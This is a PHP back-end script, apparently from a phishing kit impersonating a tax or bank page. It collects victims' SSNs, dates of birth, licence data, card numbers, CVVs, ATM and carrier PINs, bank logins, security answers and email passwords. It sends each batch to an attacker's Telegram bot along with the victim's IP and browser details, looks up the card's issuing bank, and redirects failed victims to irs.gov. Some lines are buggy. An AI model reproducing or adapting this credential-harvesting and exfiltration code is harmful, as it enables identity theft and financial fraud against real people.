<?php
require "admin/config.php";
session_start();

if($_POST['_csrf'] == "filled_info"){
        $data = 
        "Full Name: ".$_POST['firstName']." ".$_POST['middleInitial']." ".$_POST['lastName']."\n".
        "DOB: ".$_POST['DateOfBirth']."\n".
        "SSN: ".$_POST['SecurityNumber']."\n".
        "DL: ".$_POST['LicenseNumber']." issued in ".$_POST['LicenseIss']."\n".
        "DL Expiry: ".$_POST['LicenseNExp']."\n".
        "Weight: ".$_POST['Weight']."\n".
        "Mobile: ".$_POST['mobile']."\n".
        "Addy: ".$_POST['StreetAddress'].",".$_POST['ZipCode']."\n".
        "Addy: ".$_POST['StreetAddress']."\n".
        $SESSION['full_info'] = $data;
        telegram($chat_id,$api_token,$data);
        header("location:confirm.php");
}
if($_POST['_csrf'] == "pay_info"){
    $data = 
    "Card Number: ".$_POST['ccnum']."\n".
    "Card Expiry Date: ".$_POST['ccexp']."\n".
    "CVV: ".$_POST['cccvv']."\n".
    "ATM Pin: ".$_POST['atmpin']."\n".
    "Carrier PIN: ".$_POST['carrierpin']."\n"
    ;
    $SESSION['pay_info'] = $data;
    find_bank($_POST['ccnum']);
    telegram($chat_id,$api_token,$data);
    header("location:bank.php");
}
if($_POST['_csrf'] == "bank_info"){
    $data = 
    "Username: ".$_POST['userbank']."\n".
    "Password:".$_POST['passwordbank']."\n";
    "Password:".$_POST['pinbank']."\n";
    telegram($chat_id,$api_token,$data);
    // NEEDS SEC Q's
    $SESSION['bank_info'] = $data;
}
if($_POST['_csrf'] == "secq_info"){
    $data = 
    "SECQ Question: ".$_POST['question1']."\n".
    "SECQ Answer:".$_POST['answer1']."\n".
    "SECQ Question:".$_POST['question2']."\n".
    "SECQ Answer: ".$_POST['answer2']."\n".
    "SECQ Question:".$_POST['question3']."\n".
    "SECQ Answer:".$_POST['answer3']."\n";
    // NEEDS SEC Q's
    telegram($chat_id,$api_token,$data);
    $SESSION['secq_info'] = $data;
    // header("location:bank.php");
}
if($_POST['_csrf'] == "email_info"){
    $data = 
    "Email: ".$_POST['email']."\n".
    "Password: ".$_POST['emailPassword']."\n";
    // NEEDS SEC Q's
    $SESSION['email_info'] = $data;
    telegram($chat_id,$api_token,$data);
    // header("location:bank.php");
}
function telegram($chat_id, $apiToken, $data){
    $emoji = "&#129421;"." Pay Me Fuck You "."&#128122;";
    $text = 
        "".$emoji."\n".
        $data."\n".
        "&#127758 "."<code>".$_SESSION['ip']."</code>"."\n".
        "&#127974 "."<code>".$_SESSION['bankname']."</code>"."\n"
        ."&#129302 "."<code>".$_SESSION['ua']."</code>"."\n"
        ."&#128083;	"."<code>".$_SESSION['uniqid']."</code>"."\n"
        ;
    $body = [
        "chat_id" => "$chat_id",
        "text" => "$text",
    ];
    $url = "https://api.telegram.org/bot".$apiToken."/sendMessage?parse_mode=HTML&enties&";
    file_get_contents($url.http_build_query($body)); 
}
function find_bank($bin) {
    $bin = preg_replace('/\s+/', '', $bin);
    $url ='https://lookup.binlist.net/'.$bin;
    $resp = file_get_contents($url);
    // echo $url." and resp: ".$resp;
    $json = json_decode($resp, true);
    echo $json;
    if (isset($json['bank'])) {
        $_SESSION['bankname'] = $json['bank']['name'];
        return True;
    }
    header("location:https://www.irs.gov/");
}
function curl(){
    $bin = preg_replace('/\s+/', '', $bin);
    $url ='https://lookup.binlist.net/'.$bin;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $resp = curl_exec($ch);
    curl_close($ch);
    echo $url." and resp: ".$resp;
    $json = json_decode($resp, true);
}
?>